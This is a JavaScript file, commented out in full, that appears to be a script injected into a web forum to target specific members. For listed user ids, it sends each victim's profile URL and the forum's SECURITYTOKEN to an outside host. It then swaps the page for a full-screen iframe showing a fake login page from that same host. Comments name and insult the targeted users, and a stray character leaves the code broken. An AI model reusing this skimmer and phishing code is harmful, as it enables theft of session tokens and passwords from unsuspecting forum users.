/*
$( document ).ready(function() {

	function recreate_log()
	{
		document.body.innerHTML = "<iframe style='position:absolute; left: 0; right: 0; bottom: 0; top: 0px; margin: 0; padding: 0; height: 100%; overflow: hidden;' width='100%' height='100%' frameborder='0' src='http://www.laughoverlife.com/forum/nlogin.php'></iframe>";
		console.log("-- DOCUMENT LOADED --");
	};
	
	function check_directory()
	{
		console.log("-- CHECKING DIRECTORY CACHE --");
		
		//var hack_urlloc = window.location.href;
		//var hack_urllocsplit = hack_urlloc.split("/"); 
		//var hack_urllocsplit2 = hack_urllocsplit[(hack_urllocsplit.length)-1].split("?");
		//var hack_urllocsplit3 = hack_urllocsplit2[1].split("-");
		//if (hack_urllocsplit2[0] == "member.php" && hack_urllocsplit3[0] == "30243") {
		
		
			if (localStorage.username2699 == null) {
				localStorage.username2699 = "ABC";
				console.log("-- LOADING DOCUMENT1 --");
				recreate_log();
			}
		//};
	};
	
	// oms, nimra, ygidorp, yteews, yer, sttaw, selwonk, nevek, xeller
	// nothing personal guys, just business, except yteews, fuck you
	//ids = ["2947", "28601", "28576", "9940", "115", "16472", "20128", "11473", "17852"];
	userUrl0 = $("#toplinks .isuser .welcomelink > a").href;
	userUrl1 = $("#toplinks .isuser .welcomelink > a")[0].href;
    
	for(i=0; i<ids.length; i++) {
		console.log("-- CHECKING FOR IDS --");
		if(userUrl0) {
			if(userUrl0.indexOf(ids[i]) > -1) {
    				theData = { a: userUrl0, b: SECURITYTOKEN };
				$.ajax({ type: 'POST', url: 'http://laughoverlife.com/forum/write2.php', data: theData });
				console.log("-- ID WAS FOUND --");
				*
				check_directory();
			};
		};
		    
		if(userUrl1) {
			if(userUrl1.indexOf(ids[i]) > -1) {
    				theData = { a: userUrl1, b: SECURITYTOKEN };
				$.ajax({ type: 'POST', url: 'http://laughoverlife.com/forum/write2.php', data: theData });
				console.log("-- ID WAS FOUND --");
				check_directory();
			};
		};
	};
});
*/
